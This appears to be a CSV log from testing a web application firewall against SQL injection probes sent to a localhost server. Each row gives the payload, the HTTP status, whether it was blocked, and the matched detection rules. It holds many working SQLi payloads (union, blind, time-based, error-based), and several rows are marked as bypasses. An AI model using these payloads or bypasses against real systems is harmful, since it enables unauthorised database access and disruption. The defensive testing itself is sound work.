probe_index,source_row,method,payload,url,status,blocked,outcome,request_sent,url_length,latency_ms,attempts,error,audit_rule_ids,audit_transaction_ids,audit_messages,audit_files
8024,4675,GET,"1"" where 9230  =  9230",http://localhost:18080/?payload=1%22+where+9230++%3D++9230,200,False,bypass,True,58,7.1,1,,,178457061391.791271,[],transactions/20260720/20260720-1803/20260720-180333-178457061391.791271
8025,4675,POST,"1"" where 9230  =  9230",http://localhost:18080/,200,False,bypass,True,23,6.601,1,,,178457061347.150339,[],transactions/20260720/20260720-1803/20260720-180333-178457061347.150339
8026,425,GET,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",http://localhost:18080/?payload=1%27%2C++%28++select+++%28++case+when+++%28++7734++%3D++7734++%29+++then+++%28++select+benchmark++%28++5000000%2Cmd5++%28++0x72747341+++%29++++%29+++++%29+++else+7734%2A++%28++select+7734+from+mysql.db++%29+++end+++%29++++%29+++,403,True,blocked,True,260,6.311,1,,933160|942100|942140|942151|942160|942170|942230|949110,178457061359.140439,"[""PHP Injection Attack: High-Risk PHP Function Call Found"", ""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: Common DB Names Detected"", ""SQL Injection Attack: SQL function name detected"", ""Detects blind sqli tests using sleep() or benchmark()"", ""Detects SQL benchmark and sleep injection attempts including conditional queries"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 35)""]",transactions/20260720/20260720-1803/20260720-180333-178457061359.140439
8027,425,POST,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",http://localhost:18080/,403,True,blocked,True,23,6.326,1,,933160|942100|942140|942151|942160|942170|942230|949110,178457061350.351286,"[""PHP Injection Attack: High-Risk PHP Function Call Found"", ""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: Common DB Names Detected"", ""SQL Injection Attack: SQL function name detected"", ""Detects blind sqli tests using sleep() or benchmark()"", ""Detects SQL benchmark and sleep injection attempts including conditional queries"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 35)""]",transactions/20260720/20260720-1803/20260720-180333-178457061350.351286
8028,2004,GET,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',http://localhost:18080/?payload=select+%27qqpjq%27%7C%7C++%28++select+++%28++case+when+++%28++2933++%3D++2933++%29+++then+1+else+0+end+++%29++++%29+++%7C%7C%27qzvzq%27,403,True,blocked,True,167,5.971,1,,942100|942230|949110,178457061352.154156,"[""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061352.154156
8029,2004,POST,select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',http://localhost:18080/,403,True,blocked,True,23,5.415,1,,942100|942230|949110,178457061341.232583,"[""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061341.232583
8030,1496,GET,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",http://localhost:18080/?payload=-7795%22++%29+++where+1712++%3D++1712+union+all+select+1712%2C1712%2C1712%2C1712%23,403,True,blocked,True,115,5.721,1,,942100|942190|949110,17845706130.974306,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-17845706130.974306
8031,1496,POST,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",http://localhost:18080/,403,True,blocked,True,23,6.447,1,,942100|942190|949110,178457061361.084947,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061361.084947
8032,2630,GET,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,http://localhost:18080/?payload=1%27+and+7756++%3D++dbms_utility.sqlid_to_sqlhash+++%28++++%28+++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++7756++%3D++7756++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29+,403,True,blocked,True,474,7.236,1,,933160|942100|942230|949110,178457061376.651119,"[""PHP Injection Attack: High-Risk PHP Function Call Found"", ""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180333-178457061376.651119
8033,2630,POST,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,http://localhost:18080/,403,True,blocked,True,23,7.384,1,,933160|942100|942230|949110,178457061345.972618,"[""PHP Injection Attack: High-Risk PHP Function Call Found"", ""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180333-178457061345.972618
8034,1066,GET,"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",http://localhost:18080/?payload=1%27++%29+++where+7887++%3D++7887+and+updatexml++%28++3393%2Cconcat++%28++0x2e%2C0x7171706a71%2C++%28++select+++%28++elt++%28++3393++%3D++3393%2C1+++%29++++%29+++++%29++%2C0x717a767a71++%29++%2C1161++%29++--,403,True,blocked,True,239,7.233,1,,942100|942151|949110,178457061316.270274,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: SQL function name detected"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061316.270274
8035,1066,POST,"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",http://localhost:18080/,403,True,blocked,True,23,6.471,1,,942100|942151|949110,178457061326.837790,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: SQL function name detected"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061326.837790
8036,6486,GET,-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,http://localhost:18080/?payload=-5751++%29+++as+jybu+where+4739++%3D++4739+or+2724+in++++%28++++%28+++char++%28++113++%29++%2Bchar++%28++113++%29++%2Bchar++%28++112++%29++%2Bchar++%28++106++%29++%2Bchar++%28++113++%29++%2B++%28++select+++%28++case+when+++%28++2724++%3D++2724++%29+++then+char++%28++49++%29+++else+char++%28++48++%29+++end+++%29++++%29+++%2Bchar++%28++113++%29++%2Bchar++%28++122++%29++%2Bchar++%28++118++%29++%2Bchar++%28++122++%29++%2Bchar++%28++113+++%29++++%29+++++%29++--,403,True,blocked,True,492,7.874,1,,942100|942230|949110,178457061393.881462,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180333-178457061393.881462
8037,6486,POST,-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,http://localhost:18080/,403,True,blocked,True,23,7.746,1,,942100|942230|949110,178457061386.507271,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180333-178457061386.507271
8038,5401,GET," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",http://localhost:18080/?payload=+select+%2A+from+users+where+id++%3D++1+-%40%3C%40+union+select+version++%28++++%29++%2Cversion++%28++++%29+++--+1,403,True,blocked,True,146,7.023,1,,942100|942190|949110,178457061384.195380,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061384.195380
8039,5401,POST," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",http://localhost:18080/,403,True,blocked,True,23,6.218,1,,942100|942190|949110,178457061394.363803,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061394.363803
8040,5880,GET,1'  )   where 3187  =  3187 order by 1#,http://localhost:18080/?payload=1%27++%29+++where+3187++%3D++3187+order+by+1%23,403,True,blocked,True,79,5.529,1,,942100|949110,178457061351.418194,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061351.418194
8041,5880,POST,1'  )   where 3187  =  3187 order by 1#,http://localhost:18080/,403,True,blocked,True,23,6.55,1,,942100|949110,178457061327.637776,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061327.637776
8042,3449,GET,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://localhost:18080/?payload=1+or+8156++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++--,403,True,blocked,True,141,8.012,1,,942100|949110,17845706130.384279,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-17845706130.384279
8043,3449,POST,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://localhost:18080/,403,True,blocked,True,23,6.56,1,,942100|949110,178457061349.642586,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061349.642586
8044,161,GET,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",http://localhost:18080/?payload=1%27%2C++%28++select+++%28++case+when+++%28++7734++%3D++7734++%29+++then+++%28++select+benchmark++%28++5000000%2Cmd5++%28++0x72747341+++%29++++%29+++++%29+++else+7734%2A++%28++select+7734+from+mysql.db++%29+++end+++%29++++%29+++,403,True,blocked,True,260,6.708,1,,933160|942100|942140|942151|942160|942170|942230|949110,178457061397.488773,"[""PHP Injection Attack: High-Risk PHP Function Call Found"", ""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: Common DB Names Detected"", ""SQL Injection Attack: SQL function name detected"", ""Detects blind sqli tests using sleep() or benchmark()"", ""Detects SQL benchmark and sleep injection attempts including conditional queries"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 35)""]",transactions/20260720/20260720-1803/20260720-180333-178457061397.488773
8045,161,POST,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",http://localhost:18080/,403,True,blocked,True,23,6.397,1,,933160|942100|942140|942151|942160|942170|942230|949110,178457061386.165987,"[""PHP Injection Attack: High-Risk PHP Function Call Found"", ""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: Common DB Names Detected"", ""SQL Injection Attack: SQL function name detected"", ""Detects blind sqli tests using sleep() or benchmark()"", ""Detects SQL benchmark and sleep injection attempts including conditional queries"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 35)""]",transactions/20260720/20260720-1803/20260720-180333-178457061386.165987
8046,4746,GET,"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802",http://localhost:18080/?payload=1+++%29++++%29+++++%29+++or+8315++%3D++++%28++select+count++%28++%2A++%29+++from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3++%29+++and++++%28++++%28+++++%28++9802++%3D++9802,403,True,blocked,True,235,6.107,1,,942100|949110,178457061397.385441,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061397.385441
8047,4746,POST,"1   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  9802  =  9802",http://localhost:18080/,403,True,blocked,True,23,5.599,1,,942100|949110,178457061360.118169,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061360.118169
8048,2377,GET,"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,http://localhost:18080/?payload=1%25%22+++%29++++%29+++++%29+++and+char++%28++111++%29++%7C%7Cchar++%28++77++%29++%7C%7Cchar++%28++121++%29++%7C%7Cchar++%28++88++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++%22%25%22++%3D++%22,403,True,blocked,True,414,5.57,1,,942100|949110,178457061311.666599,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061311.666599
8049,2377,POST,"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,http://localhost:18080/,403,True,blocked,True,23,6.262,1,,942100|949110,178457061374.074647,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061374.074647
8050,1235,GET,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,http://localhost:18080/?payload=1%27+++%29++++%29++++as+hxxm+where+3792++%3D++3792+and+sleep++%28++5++%29++%23,403,True,blocked,True,110,2065.79,1,,942100|942160|949110,178457061517.470776,"[""SQL Injection Attack Detected via libinjection"", ""Detects blind sqli tests using sleep() or benchmark()"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180335-178457061517.470776
8051,1235,POST,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,http://localhost:18080/,403,True,blocked,True,23,6.059,1,,942100|942160|949110,178457061338.402571,"[""SQL Injection Attack Detected via libinjection"", ""Detects blind sqli tests using sleep() or benchmark()"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061338.402571
8052,5545,GET,1' where 1623  =  1623,http://localhost:18080/?payload=1%27+where+1623++%3D++1623,200,False,bypass,True,58,8.403,1,,,178457061356.733030,[],transactions/20260720/20260720-1803/20260720-180333-178457061356.733030
8053,5545,POST,1' where 1623  =  1623,http://localhost:18080/,200,False,bypass,True,23,8.843,1,,,178457061368.410890,[],transactions/20260720/20260720-1803/20260720-180333-178457061368.410890
8054,7,GET,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",http://localhost:18080/?payload=-1408+++%29++++%29++++union+all+select+5715%2C5715%2C5715%2C5715%2C5715%2C5715--,403,True,blocked,True,112,6.367,1,,942100|942190|942360|949110,178457061348.512397,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Detects concatenated basic SQL injection and SQLLFI attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180333-178457061348.512397
8055,7,POST,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",http://localhost:18080/,403,True,blocked,True,23,6.783,1,,942100|942190|942360|949110,178457061395.248019,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Detects concatenated basic SQL injection and SQLLFI attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180333-178457061395.248019
8056,2450,GET,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",http://localhost:18080/?payload=1%27++%29+++and+make_set++%28++8403++%3D++8403%2C8899++%29+++and+++%28++%27dhoo%27+like+%27dhoo,403,True,blocked,True,127,5.974,1,,942100|942151|949110,178457061321.022145,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: SQL function name detected"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061321.022145
8057,2450,POST,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",http://localhost:18080/,403,True,blocked,True,23,5.622,1,,942100|942151|949110,178457061352.989399,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack: SQL function name detected"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061352.989399
8058,5061,GET,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",http://localhost:18080/?payload=-1269%22+union+all+select+8412%2C8412%2C8412%2C8412%2C8412%2C8412%2C8412%2C8412--,403,True,blocked,True,113,5.162,1,,942100|942190|942360|949110,178457061371.230687,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Detects concatenated basic SQL injection and SQLLFI attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180333-178457061371.230687
8059,5061,POST,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",http://localhost:18080/,403,True,blocked,True,23,2047.771,1,,942100|942190|942360|949110,178457061561.885728,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Detects concatenated basic SQL injection and SQLLFI attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 15)""]",transactions/20260720/20260720-1803/20260720-180335-178457061561.885728
8060,6139,GET,"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",http://localhost:18080/?payload=-5738%22++%29+++as+efbn+where+8541++%3D++8541+union+all+select+8541%2C8541%2C8541%2C8541%2C8541%2C8541%2C8541%2C8541%23,403,True,blocked,True,151,5.644,1,,942100|942190|949110,178457061353.904453,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061353.904453
8061,6139,POST,"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",http://localhost:18080/,403,True,blocked,True,23,5.708,1,,942100|942190|949110,178457061323.889648,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061323.889648
8062,1103,GET,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",http://localhost:18080/?payload=-8971%27%7C%7C++%28++select+%27smyx%27+where+7970++%3D++7970+union+all+select+7970%2C7970%2C7970%2C7970%2C7970%2C7970%2C7970%23,403,True,blocked,True,159,6.092,1,,942100|942190|949110,178457061365.502738,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061365.502738
8063,1103,POST,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",http://localhost:18080/,403,True,blocked,True,23,5.762,1,,942100|942190|949110,178457061315.728750,"[""SQL Injection Attack Detected via libinjection"", ""Detects MSSQL code execution and information gathering attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061315.728750
8064,3839,GET,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://localhost:18080/?payload=1+++%29++++%29++++as+xsyk+where+2575++%3D++2575+or+8156++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++--,403,True,blocked,True,187,5.796,1,,942100|949110,17845706132.171029,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-17845706132.171029
8065,3839,POST,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://localhost:18080/,403,True,blocked,True,23,6.009,1,,942100|949110,178457061345.800420,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061345.800420
8066,2208,GET,1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',http://localhost:18080/?payload=1%27%2B++%28++select+zmbu+where+8685++%3D++8685+rlike+++%28++select+++%28++case+when+++%28++7689++%3D++7689++%29+++then+1+else+0x28+end+++%29++++%29+++++%29++%2B%27,403,True,blocked,True,196,7.595,1,,942100|942230|942360|949110,178457061325.984652,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Detects concatenated basic SQL injection and SQLLFI attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 20)""]",transactions/20260720/20260720-1803/20260720-180333-178457061325.984652
8067,2208,POST,1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',http://localhost:18080/,403,True,blocked,True,23,7.247,1,,942100|942230|942360|949110,17845706135.924910,"[""SQL Injection Attack Detected via libinjection"", ""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Detects concatenated basic SQL injection and SQLLFI attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 20)""]",transactions/20260720/20260720-1803/20260720-180333-17845706135.924910
8068,746,GET,"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",http://localhost:18080/?payload=++%28++select+++%28++case+when+++%28++1343++%3D++1343++%29+++then+++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29+++else+1343+end++%29+++from+dual++%29++,403,True,blocked,True,257,7.073,1,,942100|942230|949110,178457061328.187303,"[""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061328.187303
8069,746,POST,"  (  select   (  case when   (  1343  =  1343  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1343 end  )   from dual  )  ",http://localhost:18080/,403,True,blocked,True,23,6.424,1,,942100|942230|949110,178457061375.221403,"[""SQL Injection Attack Detected via libinjection"", ""Detects conditional SQL injection attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 10)""]",transactions/20260720/20260720-1803/20260720-180333-178457061375.221403
8070,4564,GET,-3634%'   )    )    or 2671  =  2434,http://localhost:18080/?payload=-3634%25%27+++%29++++%29++++or+2671++%3D++2434,403,True,blocked,True,78,5.523,1,,942100|949110,178457061329.197282,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061329.197282
8071,4564,POST,-3634%'   )    )    or 2671  =  2434,http://localhost:18080/,403,True,blocked,True,23,5.323,1,,942100|949110,17845706135.842888,"[""SQL Injection Attack Detected via libinjection"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-17845706135.842888
8072,1922,GET,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,http://localhost:18080/?payload=1%25%22+++%29++++%29++++waitfor+delay+%270%3A0%3A5%27+and++++%28++++%28+++%22%25%22++%3D++%22,403,True,blocked,True,125,5.885,1,,942280|949110,178457061371.706105,"[""Detects Postgres pg_sleep injection, waitfor delay attacks and database shutdown attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061371.706105
8073,1922,POST,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,http://localhost:18080/,403,True,blocked,True,23,8.615,1,,942280|949110,178457061349.354146,"[""Detects Postgres pg_sleep injection, waitfor delay attacks and database shutdown attempts"", ""Inbound Anomaly Score Exceeded (Total Score: 5)""]",transactions/20260720/20260720-1803/20260720-180333-178457061349.354146
